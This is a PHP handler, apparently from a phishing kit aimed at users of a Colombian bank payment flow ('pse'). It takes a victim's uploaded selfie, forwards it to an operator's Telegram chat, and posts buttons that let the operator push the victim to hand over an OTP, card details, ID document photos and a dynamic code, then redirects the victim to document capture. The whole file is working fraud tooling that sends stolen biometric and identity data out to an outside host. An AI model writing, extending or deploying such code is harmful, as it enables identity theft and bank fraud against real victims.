<?php
ini_set('display_errors', 0);
error_reporting(E_ALL);

if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/../../config/config.php';
}
$conn = require __DIR__ . '/../../config/db.php';

$botToken = $config['botToken'];
$chatId = $config['chatId'];
$baseUrl = $config['baseUrl'];
$security_key = $config['security_key'];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(400);
    echo json_encode(['error' => 'No data']);
    exit;
}

$dataUrl = $_POST['selfie'] ?? $_POST['image'] ?? '';
$cliente_id = $_POST['cliente_id'] ?? '';

if (empty($dataUrl) || empty($cliente_id)) {
    http_response_code(400);
    echo json_encode(['error' => 'Faltan datos']);
    exit;
}

if (!preg_match('/^data:image\/(\w+);base64,/', $dataUrl, $type)) {
    http_response_code(400);
    echo json_encode(['error' => 'Formato de imagen inválido']);
    exit;
}

$ext = strtolower($type[1]);
$encoded = substr($dataUrl, strpos($dataUrl, ',') + 1);
$decoded = base64_decode($encoded);

// Guardar en /tmp (único dir escribible en Vercel Lambda)
$tmpFile = tempnam(sys_get_temp_dir(), 'selfie_') . '.' . $ext;
file_put_contents($tmpFile, $decoded);

// Enviar foto a Telegram
$ch = curl_init("https://api.telegram.org/bot$botToken/sendPhoto");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'chat_id' => $chatId,
    'photo' => new CURLFile($tmpFile, 'image/' . $ext, 'selfie_' . $cliente_id . '.' . $ext),
    'caption' => "📸 *Nueva Selfie Recibida*\n🆔 Cliente: `$cliente_id`",
    'parse_mode' => 'Markdown',
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
$selfieResult = curl_exec($ch);

// Extraer file_id de Telegram
$tgData = $selfieResult ? json_decode($selfieResult, true) : null;
$selfieRef = 'selfie_sent'; // fallback
if ($tgData && $tgData['ok'] && isset($tgData['result']['photo'])) {
    $photos = $tgData['result']['photo'];
    $selfieRef = end($photos)['file_id'];
}

@unlink($tmpFile);

// Enviar botones de acción
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$cliente_id"],
            ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$cliente_id"],
        ],
        [
            ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$cliente_id"],
            ['text' => '💳 CC',         'callback_data' => "cmd_5_$cliente_id"],
        ],
        [
            ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$cliente_id"],
            ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$cliente_id"],
        ],
        [
            ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$cliente_id"],
            ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$cliente_id"]
        ],
        [
            ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$cliente_id"],
            ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$cliente_id"]
        ],
        [
            ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$cliente_id"],
            ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$cliente_id"],
            ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$cliente_id"]
        ]
    ]
];

$ch2 = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS, [
    'chat_id' => $chatId,
    'text' => "📸 Selfie recibida. Cliente: `$cliente_id`",
    'parse_mode' => 'Markdown',
    'reply_markup' => json_encode($keyboard),
]);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch2, CURLOPT_TIMEOUT, 10);
curl_exec($ch2);

// Actualizar DB
try {
    $stmt = $conn->prepare("UPDATE pse SET foto_selfie = :foto WHERE id = :id");
    $stmt->execute(['foto' => 'selfie_' . $cliente_id . '_sent', 'id' => $cliente_id]);
}
catch (Exception $e) {
    error_log('[procesar_selfie] DB: ' . $e->getMessage());
}

// Redirigir
$isRetry = isset($_POST['retry']) && $_POST['retry'] == '1';
if ($isRetry) {
    header("Location: ../../index.php?status=espera&id=" . $cliente_id);
}
else {
    header("Location: ../../index.php?status=doc_front&id=" . $cliente_id);
}
exit();
?>
